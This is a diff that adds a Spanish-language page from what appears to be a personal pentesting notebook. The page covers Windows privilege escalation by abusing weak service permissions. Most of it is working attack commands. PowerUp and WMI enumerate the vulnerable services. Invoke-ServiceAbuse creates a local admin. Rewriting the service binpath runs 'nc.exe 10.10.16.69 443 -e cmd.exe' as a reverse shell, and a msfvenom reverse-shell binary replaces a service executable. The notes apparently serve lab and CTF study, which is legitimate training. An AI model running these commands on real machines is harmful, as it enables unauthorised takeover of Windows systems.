@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Permisos en Servicios | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="permisos-en-servicios">
+          <div class="note-tabbar">
+            <span>Permisos en Servicios</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Servicios y procesos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / servicios y procesos</p>
+            <h2>Permisos en Servicios</h2>
+
+            <h2>1. Enumerar servicios vulnerables</h2>
+
+            <h3><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></h3>
+
+            <section class="code-card">
+              <h3>PowerShell: Buscar todas las posibles vulnerabilidades</h3>
+              <pre><code>. .\PowerUp.ps1
+Invoke-AllChecks # Escaneo completo
+Invoke-PrivescAudit # Escaneo de servicios mal configurados y credenciales en texto plano</code></pre>
+            </section>
+
+            <h3>Manual</h3>
+
+            <aside class="callout">
+              <p><strong>Ejecutar función auxiliar: <span>Función Auxiliar</span></strong> </p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Listar servicios con binarios y Path modificables. Ej. Servicio vulnerable filepermsvc</h3>
+              <pre><code># PowerShell: Enumera todos los servicios desde los registros
+ls HKLM:\SYSTEM\CurrentControlSet\Services\
+
+# PowerShell: Enumera servicios que ejecutan un binario .exe y su ruta es modificable
+Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object { if(ModifiablePath (($_.pathname -split &quot;.exe&quot;)[0]+&quot;.exe&quot;)){ $_ } }
+
+# CMD
+wmic service list brief  # Enumera todos los servicios</code></pre>
+            </section>
+
+            <h2>2. Ataque</h2>
+
+            <h2>Modificar el path del servicio</h2>
+
+            <p><span class="notebook-review-note">[REVISAR]: imagen de Obsidian no migrada: Pasted image 20260318143730.png</span></p>
+
+            <section class="code-card">
+              <h3>Payloads</h3>
+              <pre><code># Payload 1: Crear usuario john y lo añade local_admin
+Invoke-ServiceAbuse -ServiceName 'UsoSvc'
+
+# Payload 2: Ejecutar nc.exe
+Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command &quot;C:\windows\temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe&quot;
+
+# Payload 3: Modificar Path para ejecutar nc.exe o un backdoor con msfvenom
+# Powershell Enumera Path del servicio UsoSvc
+Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq &quot;UsoSvc&quot;} | Select-Object *
+# CMD Enumera Path del servicio UsoSvc
+sc.exe qc UsoSvc
+# Modificar Path
+sc.exe config UsoSvc binpath=&quot;C:\windows\temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe&quot;
+# Reiniciar servicio
+sc.exe stop UsoSvc
+sc.exe start UsoSvc</code></pre>
+            </section>
+
+            <h2>Hijacking del binario del servicio</h2>
+
+            <section class="code-card">
+              <h3>Ver Path del Binario del servicio filepermsvc</h3>
+              <pre><code># PowerShell
+Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq &quot;filepermsvc&quot;} | Select-Object *
+# CMD
+sc qc &lt;service_name&gt;
+
+# Path: C:\Program Files\filepermservice.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Comprobar permisos de escritura en el Path</h3>
+              <pre><code># PowerShell/CMD
+icacls &quot;C:\Program Files\filepermservice.exe&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Payload y Listener</h3>
+              <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; rev.exe
+rlwrap nc 443</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Reemplazar el binario por una reverse shell</h3>
+              <pre><code># PowerShell
+copy rev.exe &quot;C:\Program Files\filepermservice.exe&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Reiniciar el servicio. Se debe producir un fallo al reiniciar</h3>
+              <pre><code># PowerShell
+cmd /c sc stop filepermservice
+cmd /c sc start filepermservice
+# CMD / PowerShell
+sc.exe stop filepermservice
+net stop filepermservice # Alternativa
+sc.exe start filepermservice
+net start filepermservice # Alternativa</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=remote">Remote</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>servicios</span>
+              <span>procesos</span>
+              <span>permisos</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
